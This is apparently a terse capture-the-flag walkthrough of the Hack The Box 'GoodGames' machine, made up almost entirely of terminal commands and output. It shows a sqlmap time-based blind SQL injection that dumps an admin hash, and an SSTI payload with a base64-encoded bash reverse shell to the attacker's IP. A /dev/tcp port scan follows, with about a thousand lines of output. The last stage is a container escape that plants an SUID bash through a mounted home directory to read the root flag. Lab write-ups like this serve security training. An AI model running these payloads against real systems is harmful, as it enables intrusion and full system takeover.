@@ -1,0 +1,1212 @@
+1.The webpage login is vulnerable to sqli, It can be exploit with the Sqlmap
+┌──(sabeshan㉿kali)-[~/HTB/OSCP/linux/GooDGames]
+└─$ sqlmap -r sql.req --batch -D main -T user --dump 
+        ___
+       __H__                                                                                                                                                 
+ ___ ___[(]_____ ___ ___  {1.9.6#stable}                                                                                                                     
+|_ -| . [.]     | .'| . |                                                                                                                                    
+|___|_  [.]_|_|_|__,|  _|                                                                                                                                    
+      |_|V...       |_|   https://sqlmap.org                                                                                                                 
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 08:32:27 /2025-08-29/
+
+[08:32:27] [INFO] parsing HTTP request from 'sql.req'
+[08:32:27] [INFO] resuming back-end DBMS 'mysql' 
+[08:32:27] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: email (POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: email=test@gmail.com' AND (SELECT 9507 FROM (SELECT(SLEEP(5)))GDgi) AND 'ipAk'='ipAk&password=pass
+---
+[08:32:27] [INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL >= 5.0.12
+[08:32:27] [INFO] fetching columns for table 'user' in database 'main'
+[08:32:27] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)                              
+do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
+[08:32:40] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
+4
+[08:32:42] [INFO] retrieved: 
+[08:32:52] [INFO] adjusting time delay to 2 seconds due to good response times
+id
+[08:33:22] [INFO] retrieved: email
+[08:34:11] [INFO] retrieved: password
+[08:35:40] [INFO] retrieved: name
+[08:36:15] [INFO] fetching entries for table 'user' in database 'main'
+[08:36:15] [INFO] fetching number of entries for table 'user' in database 'main'
+[08:36:15] [INFO] retrieved: 1
+[08:36:18] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)                     
+a
+[08:36:44] [INFO] adjusting time delay to 1 second due to good response times
+dmin
+[08:37:03] [INFO] retrieved: 
+[08:37:08] [ERROR] invalid character detected. retrying..
+[08:37:08] [WARNING] increasing time delay to 2 seconds
+admin@goodgames.htb
+[08:40:31] [INFO] retrieved: 1
+[08:40:38] [INFO] retrieved: 2b22337f218b2d82dfc3
+[08:44:28] [ERROR] invalid character detected. retrying..
+[08:44:28] [WARNING] increasing time delay to 3 seconds
+b6f77e7cb8ec
+[08:47:36] [INFO] recognized possible password hashes in column 'password'
+do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
+do you want to crack them via a dictionary-based attack? [Y/n/q] Y
+[08:47:36] [INFO] using hash method 'md5_generic_passwd'
+what dictionary do you want to use?
+[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
+[2] custom dictionary file
+[3] file with list of dictionary files
+> 1
+[08:47:36] [INFO] using default dictionary
+do you want to use common password suffixes? (slow!) [y/N] N
+[08:47:36] [INFO] starting dictionary-based cracking (md5_generic_passwd)
+[08:47:36] [INFO] starting 2 processes 
+[08:47:48] [WARNING] no clear password(s) found                                                                                                             
+Database: main
+Table: user
+[1 entry]
++----+---------------------+--------+----------------------------------+
+| id | email               | name   | password                         |
++----+---------------------+--------+----------------------------------+
+| 1  | admin@goodgames.htb | admin  | 2b22337f218b2d82dfc3b6f77e7cb8ec | --> superadministrator
++----+---------------------+--------+----------------------------------+
+
+[08:47:48] [INFO] table 'main.`user`' dumped to CSV file '/home/sabeshan/.local/share/sqlmap/output/10.10.11.130/dump/main/user.csv'
+[08:47:48] [INFO] fetched data logged to text files under '/home/sabeshan/.local/share/sqlmap/output/10.10.11.130'
+
+[*] ending @ 08:47:48 /2025-08-29/
+After the sqlmap , there is admin credentials was here.
+-------------------------------------------------------------------------------------------------
+2. There is another login dashboard available on that , on that place use the above creds and get the admin access.
+in admin profile there is SSTI vulnerabilities exists. 
+{{config.__class__.__init__.__globals__['os'].popen('echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yLzEzMzcgMD4mMQ==${IFS}|base64${IFS}-d|bash').read()}}
+The site vulnerable to twig. Using the above payload it can be get the remote shell.
+──(sabeshan㉿kali)-[~/HTB/OSCP/linux/GooDGames]
+└─$ nc -lvnp 1337
+listening on [any] 1337 ...
+connect to [10.10.14.2] from (UNKNOWN) [10.10.11.130] 47300
+bash: cannot set terminal process group (1): Inappropriate ioctl for device
+bash: no job control in this shell
+root@3a453ab39d3d:/backend# 
+And shell was gotten
+root@3a453ab39d3d:/backend# cd /
+root@3a453ab39d3d:/# cd root
+root@3a453ab39d3d:~# ls -la
+total 20
+drwx------ 1 root root 4096 Nov  5  2021 .
+drwxr-xr-x 1 root root 4096 Nov  5  2021 ..
+lrwxrwxrwx 1 root root    9 Nov  5  2021 .bash_history -> /dev/null
+-rw-r--r-- 1 root root  570 Jan 31  2010 .bashrc
+drwx------ 3 root root 4096 Nov  5  2021 .cache
+-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
+This one is root but not actual root
+------------------------------------------------------------------------------
+3.for PORT in {0..1000}; do timeout 1 bash -c "</dev/tcp/172.19.0.2/$PORT &>/dev/null" 2>/dev/null && echo "port $PORT is open"; done
+
+
+
+root@3a453ab39d3d:/home/augustus# mount
+overlay on / type overlay (rw,relatime,lowerdir=/var/lib/docker/overlay2/l/BMOEKLXDA4EFIXZ4O4AP7LYEVQ:/var/lib/docker/overlay2/l/E365MWZN2IXKTIAKIBBWWUOADT:/var/lib/docker/overlay2/l/ZN44ERHF3TPZW7GPHTZDOBQAD5:/var/lib/docker/overlay2/l/BMI22QFRJIUAWSWNAECLQ35DQS:/var/lib/docker/overlay2/l/6KXJS2GP5OWZY2WMA64DMEN37D:/var/lib/docker/overlay2/l/FE6JM56VMBUSHKLHKZN4M7BBF7:/var/lib/docker/overlay2/l/MSWSF5XCNMHEUPP5YFFRZSUOOO:/var/lib/docker/overlay2/l/3VLCE4GRHDQSBFCRABM7ZL2II6:/var/lib/docker/overlay2/l/G4RUINBGG77H7HZT5VA3U3QNM3:/var/lib/docker/overlay2/l/3UIIMRKYCPEGS4LCPXEJLYRETY:/var/lib/docker/overlay2/l/U54SKFNVA3CXQLYRADDSJ7NRPN:/var/lib/docker/overlay2/l/UIMFGMQODUTR2562B2YJIOUNHL:/var/lib/docker/overlay2/l/HEPVGMWCYIV7JX7KCI6WZ4QYV5,upperdir=/var/lib/docker/overlay2/4bc2f5ca1b7adeaec264b5690fbc99dfe8c555f7bc8c9ac661cef6a99e859623/diff,workdir=/var/lib/docker/overlay2/4bc2f5ca1b7adeaec264b5690fbc99dfe8c555f7bc8c9ac661cef6a99e859623/work)
+proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
+tmpfs on /dev type tmpfs (rw,nosuid,size=65536k,mode=755)
+devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666)
+sysfs on /sys type sysfs (ro,nosuid,nodev,noexec,relatime)
+tmpfs on /sys/fs/cgroup type tmpfs (rw,nosuid,nodev,noexec,relatime,mode=755)
+cgroup on /sys/fs/cgroup/systemd type cgroup (ro,nosuid,nodev,noexec,relatime,xattr,name=systemd)
+cgroup on /sys/fs/cgroup/cpu,cpuacct type cgroup (ro,nosuid,nodev,noexec,relatime,cpu,cpuacct)
+cgroup on /sys/fs/cgroup/net_cls,net_prio type cgroup (ro,nosuid,nodev,noexec,relatime,net_cls,net_prio)
+cgroup on /sys/fs/cgroup/pids type cgroup (ro,nosuid,nodev,noexec,relatime,pids)
+cgroup on /sys/fs/cgroup/devices type cgroup (ro,nosuid,nodev,noexec,relatime,devices)
+cgroup on /sys/fs/cgroup/rdma type cgroup (ro,nosuid,nodev,noexec,relatime,rdma)
+cgroup on /sys/fs/cgroup/perf_event type cgroup (ro,nosuid,nodev,noexec,relatime,perf_event)
+cgroup on /sys/fs/cgroup/memory type cgroup (ro,nosuid,nodev,noexec,relatime,memory)
+cgroup on /sys/fs/cgroup/cpuset type cgroup (ro,nosuid,nodev,noexec,relatime,cpuset)
+cgroup on /sys/fs/cgroup/freezer type cgroup (ro,nosuid,nodev,noexec,relatime,freezer)
+cgroup on /sys/fs/cgroup/blkio type cgroup (ro,nosuid,nodev,noexec,relatime,blkio)
+mqueue on /dev/mqueue type mqueue (rw,nosuid,nodev,noexec,relatime)
+/dev/sda1 on /home/augustus type ext4 (rw,relatime,errors=remount-ro)
+/dev/sda1 on /etc/resolv.conf type ext4 (rw,relatime,errors=remount-ro)
+/dev/sda1 on /etc/hostname type ext4 (rw,relatime,errors=remount-ro)
+/dev/sda1 on /etc/hosts type ext4 (rw,relatime,errors=remount-ro)
+shm on /dev/shm type tmpfs (rw,nosuid,nodev,noexec,relatime,size=65536k)
+proc on /proc/bus type proc (ro,nosuid,nodev,noexec,relatime)
+proc on /proc/fs type proc (ro,nosuid,nodev,noexec,relatime)
+proc on /proc/irq type proc (ro,nosuid,nodev,noexec,relatime)
+proc on /proc/sys type proc (ro,nosuid,nodev,noexec,relatime)
+proc on /proc/sysrq-trigger type proc (ro,nosuid,nodev,noexec,relatime)
+tmpfs on /proc/acpi type tmpfs (ro,relatime)
+tmpfs on /proc/kcore type tmpfs (rw,nosuid,size=65536k,mode=755)
+tmpfs on /proc/keys type tmpfs (rw,nosuid,size=65536k,mode=755)
+tmpfs on /proc/timer_list type tmpfs (rw,nosuid,size=65536k,mode=755)
+tmpfs on /proc/sched_debug type tmpfs (rw,nosuid,size=65536k,mode=755)
+tmpfs on /sys/firmware type tmpfs (ro,relatime)
+root@3a453ab39d3d:/home/augustus# ifconfig
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 172.19.0.2  netmask 255.255.0.0  broadcast 172.19.255.255
+        ether 02:42:ac:13:00:02  txqueuelen 0  (Ethernet)
+        RX packets 2314  bytes 398570 (389.2 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 1915  bytes 1770381 (1.6 MiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 0  bytes 0 (0.0 B)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 0  bytes 0 (0.0 B)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+<}; do timeout 1 bash -c "</dev/tcp/172.19.0.1/$PORT
+> &>/dev/null" 2>/dev/null && echo "port $PORT is open"; done
+port 0 is open
+port 1 is open
+port 2 is open
+port 3 is open
+port 4 is open
+port 5 is open
+port 6 is open
+port 7 is open
+port 8 is open
+port 9 is open
+port 10 is open
+port 11 is open
+port 12 is open
+port 13 is open
+port 14 is open
+port 15 is open
+port 16 is open
+port 17 is open
+port 18 is open
+port 19 is open
+port 20 is open
+port 21 is open
+port 22 is open
+port 23 is open
+port 24 is open
+port 25 is open
+port 26 is open
+port 27 is open
+port 28 is open
+port 29 is open
+port 30 is open
+port 31 is open
+port 32 is open
+port 33 is open
+port 34 is open
+port 35 is open
+port 36 is open
+port 37 is open
+port 38 is open
+port 39 is open
+port 40 is open
+port 41 is open
+port 42 is open
+port 43 is open
+port 44 is open
+port 45 is open
+port 46 is open
+port 47 is open
+port 48 is open
+port 49 is open
+port 50 is open
+port 51 is open
+port 52 is open
+port 53 is open
+port 54 is open
+port 55 is open
+port 56 is open
+port 57 is open
+port 58 is open
+port 59 is open
+port 60 is open
+port 61 is open
+port 62 is open
+port 63 is open
+port 64 is open
+port 65 is open
+port 66 is open
+port 67 is open
+port 68 is open
+port 69 is open
+port 70 is open
+port 71 is open
+port 72 is open
+port 73 is open
+port 74 is open
+port 75 is open
+port 76 is open
+port 77 is open
+port 78 is open
+port 79 is open
+port 80 is open
+port 81 is open
+port 82 is open
+port 83 is open
+port 84 is open
+port 85 is open
+port 86 is open
+port 87 is open
+port 88 is open
+port 89 is open
+port 90 is open
+port 91 is open
+port 92 is open
+port 93 is open
+port 94 is open
+port 95 is open
+port 96 is open
+port 97 is open
+port 98 is open
+port 99 is open
+port 100 is open
+port 101 is open
+port 102 is open
+port 103 is open
+port 104 is open
+port 105 is open
+port 106 is open
+port 107 is open
+port 108 is open
+port 109 is open
+port 110 is open
+port 111 is open
+port 112 is open
+port 113 is open
+port 114 is open
+port 115 is open
+port 116 is open
+port 117 is open
+port 118 is open
+port 119 is open
+port 120 is open
+port 121 is open
+port 122 is open
+port 123 is open
+port 124 is open
+port 125 is open
+port 126 is open
+port 127 is open
+port 128 is open
+port 129 is open
+port 130 is open
+port 131 is open
+port 132 is open
+port 133 is open
+port 134 is open
+port 135 is open
+port 136 is open
+port 137 is open
+port 138 is open
+port 139 is open
+port 140 is open
+port 141 is open
+port 142 is open
+port 143 is open
+port 144 is open
+port 145 is open
+port 146 is open
+port 147 is open
+port 148 is open
+port 149 is open
+port 150 is open
+port 151 is open
+port 152 is open
+port 153 is open
+port 154 is open
+port 155 is open
+port 156 is open
+port 157 is open
+port 158 is open
+port 159 is open
+port 160 is open
+port 161 is open
+port 162 is open
+port 163 is open
+port 164 is open
+port 165 is open
+port 166 is open
+port 167 is open
+port 168 is open
+port 169 is open
+port 170 is open
+port 171 is open
+port 172 is open
+port 173 is open
+port 174 is open
+port 175 is open
+port 176 is open
+port 177 is open
+port 178 is open
+port 179 is open
+port 180 is open
+port 181 is open
+port 182 is open
+port 183 is open
+port 184 is open
+port 185 is open
+port 186 is open
+port 187 is open
+port 188 is open
+port 189 is open
+port 190 is open
+port 191 is open
+port 192 is open
+port 193 is open
+port 194 is open
+port 195 is open
+port 196 is open
+port 197 is open
+port 198 is open
+port 199 is open
+port 200 is open
+port 201 is open
+port 202 is open
+port 203 is open
+port 204 is open
+port 205 is open
+port 206 is open
+port 207 is open
+port 208 is open
+port 209 is open
+port 210 is open
+port 211 is open
+port 212 is open
+port 213 is open
+port 214 is open
+port 215 is open
+port 216 is open
+port 217 is open
+port 218 is open
+port 219 is open
+port 220 is open
+port 221 is open
+port 222 is open
+port 223 is open
+port 224 is open
+port 225 is open
+port 226 is open
+port 227 is open
+port 228 is open
+port 229 is open
+port 230 is open
+port 231 is open
+port 232 is open
+port 233 is open
+port 234 is open
+port 235 is open
+port 236 is open
+port 237 is open
+port 238 is open
+port 239 is open
+port 240 is open
+port 241 is open
+port 242 is open
+port 243 is open
+port 244 is open
+port 245 is open
+port 246 is open
+port 247 is open
+port 248 is open
+port 249 is open
+port 250 is open
+port 251 is open
+port 252 is open
+port 253 is open
+port 254 is open
+port 255 is open
+port 256 is open
+port 257 is open
+port 258 is open
+port 259 is open
+port 260 is open
+port 261 is open
+port 262 is open
+port 263 is open
+port 264 is open
+port 265 is open
+port 266 is open
+port 267 is open
+port 268 is open
+port 269 is open
+port 270 is open
+port 271 is open
+port 272 is open
+port 273 is open
+port 274 is open
+port 275 is open
+port 276 is open
+port 277 is open
+port 278 is open
+port 279 is open
+port 280 is open
+port 281 is open
+port 282 is open
+port 283 is open
+port 284 is open
+port 285 is open
+port 286 is open
+port 287 is open
+port 288 is open
+port 289 is open
+port 290 is open
+port 291 is open
+port 292 is open
+port 293 is open
+port 294 is open
+port 295 is open
+port 296 is open
+port 297 is open
+port 298 is open
+port 299 is open
+port 300 is open
+port 301 is open
+port 302 is open
+port 303 is open
+port 304 is open
+port 305 is open
+port 306 is open
+port 307 is open
+port 308 is open
+port 309 is open
+port 310 is open
+port 311 is open
+port 312 is open
+port 313 is open
+port 314 is open
+port 315 is open
+port 316 is open
+port 317 is open
+port 318 is open
+port 319 is open
+port 320 is open
+port 321 is open
+port 322 is open
+port 323 is open
+port 324 is open
+port 325 is open
+port 326 is open
+port 327 is open
+port 328 is open
+port 329 is open
+port 330 is open
+port 331 is open
+port 332 is open
+port 333 is open
+port 334 is open
+port 335 is open
+port 336 is open
+port 337 is open
+port 338 is open
+port 339 is open
+port 340 is open
+port 341 is open
+port 342 is open
+port 343 is open
+port 344 is open
+port 345 is open
+port 346 is open
+port 347 is open
+port 348 is open
+port 349 is open
+port 350 is open
+port 351 is open
+port 352 is open
+port 353 is open
+port 354 is open
+port 355 is open
+port 356 is open
+port 357 is open
+port 358 is open
+port 359 is open
+port 360 is open
+port 361 is open
+port 362 is open
+port 363 is open
+port 364 is open
+port 365 is open
+port 366 is open
+port 367 is open
+port 368 is open
+port 369 is open
+port 370 is open
+port 371 is open
+port 372 is open
+port 373 is open
+port 374 is open
+port 375 is open
+port 376 is open
+port 377 is open
+port 378 is open
+port 379 is open
+port 380 is open
+port 381 is open
+port 382 is open
+port 383 is open
+port 384 is open
+port 385 is open
+port 386 is open
+port 387 is open
+port 388 is open
+port 389 is open
+port 390 is open
+port 391 is open
+port 392 is open
+port 393 is open
+port 394 is open
+port 395 is open
+port 396 is open
+port 397 is open
+port 398 is open
+port 399 is open
+port 400 is open
+port 401 is open
+port 402 is open
+port 403 is open
+port 404 is open
+port 405 is open
+port 406 is open
+port 407 is open
+port 408 is open
+port 409 is open
+port 410 is open
+port 411 is open
+port 412 is open
+port 413 is open
+port 414 is open
+port 415 is open
+port 416 is open
+port 417 is open
+port 418 is open
+port 419 is open
+port 420 is open
+port 421 is open
+port 422 is open
+port 423 is open
+port 424 is open
+port 425 is open
+port 426 is open
+port 427 is open
+port 428 is open
+port 429 is open
+port 430 is open
+port 431 is open
+port 432 is open
+port 433 is open
+port 434 is open
+port 435 is open
+port 436 is open
+port 437 is open
+port 438 is open
+port 439 is open
+port 440 is open
+port 441 is open
+port 442 is open
+port 443 is open
+port 444 is open
+port 445 is open
+port 446 is open
+port 447 is open
+port 448 is open
+port 449 is open
+port 450 is open
+port 451 is open
+port 452 is open
+port 453 is open
+port 454 is open
+port 455 is open
+port 456 is open
+port 457 is open
+port 458 is open
+port 459 is open
+port 460 is open
+port 461 is open
+port 462 is open
+port 463 is open
+port 464 is open
+port 465 is open
+port 466 is open
+port 467 is open
+port 468 is open
+port 469 is open
+port 470 is open
+port 471 is open
+port 472 is open
+port 473 is open
+port 474 is open
+port 475 is open
+port 476 is open
+port 477 is open
+port 478 is open
+port 479 is open
+port 480 is open
+port 481 is open
+port 482 is open
+port 483 is open
+port 484 is open
+port 485 is open
+port 486 is open
+port 487 is open
+port 488 is open
+port 489 is open
+port 490 is open
+port 491 is open
+port 492 is open
+port 493 is open
+port 494 is open
+port 495 is open
+port 496 is open
+port 497 is open
+port 498 is open
+port 499 is open
+port 500 is open
+port 501 is open
+port 502 is open
+port 503 is open
+port 504 is open
+port 505 is open
+port 506 is open
+port 507 is open
+port 508 is open
+port 509 is open
+port 510 is open
+port 511 is open
+port 512 is open
+port 513 is open
+port 514 is open
+port 515 is open
+port 516 is open
+port 517 is open
+port 518 is open
+port 519 is open
+port 520 is open
+port 521 is open
+port 522 is open
+port 523 is open
+port 524 is open
+port 525 is open
+port 526 is open
+port 527 is open
+port 528 is open
+port 529 is open
+port 530 is open
+port 531 is open
+port 532 is open
+port 533 is open
+port 534 is open
+port 535 is open
+port 536 is open
+port 537 is open
+port 538 is open
+port 539 is open
+port 540 is open
+port 541 is open
+port 542 is open
+port 543 is open
+port 544 is open
+port 545 is open
+port 546 is open
+port 547 is open
+port 548 is open
+port 549 is open
+port 550 is open
+port 551 is open
+port 552 is open
+port 553 is open
+port 554 is open
+port 555 is open
+port 556 is open
+port 557 is open
+port 558 is open
+port 559 is open
+port 560 is open
+port 561 is open
+port 562 is open
+port 563 is open
+port 564 is open
+port 565 is open
+port 566 is open
+port 567 is open
+port 568 is open
+port 569 is open
+port 570 is open
+port 571 is open
+port 572 is open
+port 573 is open
+port 574 is open
+port 575 is open
+port 576 is open
+port 577 is open
+port 578 is open
+port 579 is open
+port 580 is open
+port 581 is open
+port 582 is open
+port 583 is open
+port 584 is open
+port 585 is open
+port 586 is open
+port 587 is open
+port 588 is open
+port 589 is open
+port 590 is open
+port 591 is open
+port 592 is open
+port 593 is open
+port 594 is open
+port 595 is open
+port 596 is open
+port 597 is open
+port 598 is open
+port 599 is open
+port 600 is open
+port 601 is open
+port 602 is open
+port 603 is open
+port 604 is open
+port 605 is open
+port 606 is open
+port 607 is open
+port 608 is open
+port 609 is open
+port 610 is open
+port 611 is open
+port 612 is open
+port 613 is open
+port 614 is open
+port 615 is open
+port 616 is open
+port 617 is open
+port 618 is open
+port 619 is open
+port 620 is open
+port 621 is open
+port 622 is open
+port 623 is open
+port 624 is open
+port 625 is open
+port 626 is open
+port 627 is open
+port 628 is open
+port 629 is open
+port 630 is open
+port 631 is open
+port 632 is open
+port 633 is open
+port 634 is open
+port 635 is open
+port 636 is open
+port 637 is open
+port 638 is open
+port 639 is open
+port 640 is open
+port 641 is open
+port 642 is open
+port 643 is open
+port 644 is open
+port 645 is open
+port 646 is open
+port 647 is open
+port 648 is open
+port 649 is open
+port 650 is open
+port 651 is open
+port 652 is open
+port 653 is open
+port 654 is open
+port 655 is open
+port 656 is open
+port 657 is open
+port 658 is open
+port 659 is open
+port 660 is open
+port 661 is open
+port 662 is open
+port 663 is open
+port 664 is open
+port 665 is open
+port 666 is open
+port 667 is open
+port 668 is open
+port 669 is open
+port 670 is open
+port 671 is open
+port 672 is open
+port 673 is open
+port 674 is open
+port 675 is open
+port 676 is open
+port 677 is open
+port 678 is open
+port 679 is open
+port 680 is open
+port 681 is open
+port 682 is open
+port 683 is open
+port 684 is open
+port 685 is open
+port 686 is open
+port 687 is open
+port 688 is open
+port 689 is open
+port 690 is open
+port 691 is open
+port 692 is open
+port 693 is open
+port 694 is open
+port 695 is open
+port 696 is open
+port 697 is open
+port 698 is open
+port 699 is open
+port 700 is open
+port 701 is open
+port 702 is open
+port 703 is open
+port 704 is open
+port 705 is open
+port 706 is open
+port 707 is open
+port 708 is open
+port 709 is open
+port 710 is open
+port 711 is open
+port 712 is open
+port 713 is open
+port 714 is open
+port 715 is open
+port 716 is open
+port 717 is open
+port 718 is open
+port 719 is open
+port 720 is open
+port 721 is open
+port 722 is open
+port 723 is open
+port 724 is open
+port 725 is open
+port 726 is open
+port 727 is open
+port 728 is open
+port 729 is open
+port 730 is open
+port 731 is open
+port 732 is open
+port 733 is open
+port 734 is open
+port 735 is open
+port 736 is open
+port 737 is open
+port 738 is open
+port 739 is open
+port 740 is open
+port 741 is open
+port 742 is open
+port 743 is open
+port 744 is open
+port 745 is open
+port 746 is open
+port 747 is open
+port 748 is open
+port 749 is open
+port 750 is open
+port 751 is open
+port 752 is open
+port 753 is open
+port 754 is open
+port 755 is open
+port 756 is open
+port 757 is open
+port 758 is open
+port 759 is open
+port 760 is open
+port 761 is open
+port 762 is open
+port 763 is open
+port 764 is open
+port 765 is open
+port 766 is open
+port 767 is open
+port 768 is open
+port 769 is open
+port 770 is open
+port 771 is open
+port 772 is open
+port 773 is open
+port 774 is open
+port 775 is open
+port 776 is open
+port 777 is open
+port 778 is open
+port 779 is open
+port 780 is open
+port 781 is open
+port 782 is open
+port 783 is open
+port 784 is open
+port 785 is open
+port 786 is open
+port 787 is open
+port 788 is open
+port 789 is open
+port 790 is open
+port 791 is open
+port 792 is open
+port 793 is open
+port 794 is open
+port 795 is open
+port 796 is open
+port 797 is open
+port 798 is open
+port 799 is open
+port 800 is open
+port 801 is open
+port 802 is open
+port 803 is open
+port 804 is open
+port 805 is open
+port 806 is open
+port 807 is open
+port 808 is open
+port 809 is open
+port 810 is open
+port 811 is open
+port 812 is open
+port 813 is open
+port 814 is open
+port 815 is open
+port 816 is open
+port 817 is open
+port 818 is open
+port 819 is open
+port 820 is open
+port 821 is open
+port 822 is open
+port 823 is open
+port 824 is open
+port 825 is open
+port 826 is open
+port 827 is open
+port 828 is open
+port 829 is open
+port 830 is open
+port 831 is open
+port 832 is open
+port 833 is open
+port 834 is open
+port 835 is open
+port 836 is open
+port 837 is open
+port 838 is open
+port 839 is open
+port 840 is open
+port 841 is open
+port 842 is open
+port 843 is open
+port 844 is open
+port 845 is open
+port 846 is open
+port 847 is open
+port 848 is open
+port 849 is open
+port 850 is open
+port 851 is open
+port 852 is open
+port 853 is open
+port 854 is open
+port 855 is open
+port 856 is open
+port 857 is open
+port 858 is open
+port 859 is open
+port 860 is open
+port 861 is open
+port 862 is open
+port 863 is open
+port 864 is open
+port 865 is open
+port 866 is open
+port 867 is open
+port 868 is open
+port 869 is open
+port 870 is open
+port 871 is open
+port 872 is open
+port 873 is open
+port 874 is open
+port 875 is open
+port 876 is open
+port 877 is open
+port 878 is open
+port 879 is open
+port 880 is open
+port 881 is open
+port 882 is open
+port 883 is open
+port 884 is open
+port 885 is open
+port 886 is open
+port 887 is open
+port 888 is open
+port 889 is open
+port 890 is open
+port 891 is open
+port 892 is open
+port 893 is open
+port 894 is open
+port 895 is open
+port 896 is open
+port 897 is open
+port 898 is open
+port 899 is open
+port 900 is open
+port 901 is open
+port 902 is open
+port 903 is open
+port 904 is open
+port 905 is open
+port 906 is open
+port 907 is open
+port 908 is open
+port 909 is open
+port 910 is open
+port 911 is open
+port 912 is open
+port 913 is open
+port 914 is open
+port 915 is open
+port 916 is open
+port 917 is open
+port 918 is open
+port 919 is open
+port 920 is open
+port 921 is open
+port 922 is open
+port 923 is open
+port 924 is open
+port 925 is open
+port 926 is open
+port 927 is open
+port 928 is open
+port 929 is open
+port 930 is open
+port 931 is open
+port 932 is open
+port 933 is open
+port 934 is open
+port 935 is open
+port 936 is open
+port 937 is open
+port 938 is open
+port 939 is open
+port 940 is open
+port 941 is open
+port 942 is open
+port 943 is open
+port 944 is open
+port 945 is open
+port 946 is open
+port 947 is open
+port 948 is open
+port 949 is open
+port 950 is open
+port 951 is open
+port 952 is open
+port 953 is open
+port 954 is open
+port 955 is open
+port 956 is open
+port 957 is open
+port 958 is open
+port 959 is open
+port 960 is open
+port 961 is open
+port 962 is open
+port 963 is open
+port 964 is open
+port 965 is open
+port 966 is open
+port 967 is open
+port 968 is open
+port 969 is open
+port 970 is open
+port 971 is open
+port 972 is open
+port 973 is open
+port 974 is open
+port 975 is open
+port 976 is open
+port 977 is open
+port 978 is open
+port 979 is open
+port 980 is open
+port 981 is open
+port 982 is open
+port 983 is open
+port 984 is open
+port 985 is open
+port 986 is open
+port 987 is open
+port 988 is open
+port 989 is open
+port 990 is open
+port 991 is open
+port 992 is open
+port 993 is open
+port 994 is open
+port 995 is open
+port 996 is open
+port 997 is open
+port 998 is open
+port 999 is open
+port 1000 is open
+root@3a453ab39d3d:/home/augustus# script /dev/null bash
+Script started, file is /dev/null
+# ssh augustus@12^H^H
+^C
+# ssh agus
+c^C
+# ssh augustus@172.19.0.2
+ssh: connect to host 172.19.0.2 port 22: Connection refused
+# ssh augustus@172.19.02^H^C
+# ssh augustus@172.19.0.1
+The authenticity of host '172.19.0.1 (172.19.0.1)' can't be established.
+ECDSA key fingerprint is SHA256:AvB4qtTxSVcB0PuHwoPV42/LAJ9TlyPVbd7G6Igzmj0.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '172.19.0.1' (ECDSA) to the list of known hosts.
+augustus@172.19.0.1's password: 
+Linux GoodGames 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+augustus@GoodGames:~$ cp /bin/bash .
+augustus@GoodGames:~$ exit
+logout
+Connection to 172.19.0.1 closed.
+# chown root:root bash
+# chmod 4755 bash
+# ls -la bash
+-rwsr-xr-x 1 root root 1234376 Aug 29 04:42 bash
+# 
+# ssh augustus@172.19.0.1
+augustus@172.19.0.1's password: 
+Linux GoodGames 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Fri Aug 29 05:39:41 2025 from 172.19.0.2
+augustus@GoodGames:~$ ./bash -p
+bash-5.1# cat /root/root.txt
+f2bf4ca1c35489921620b9fb50033077
+bash-5.1# 
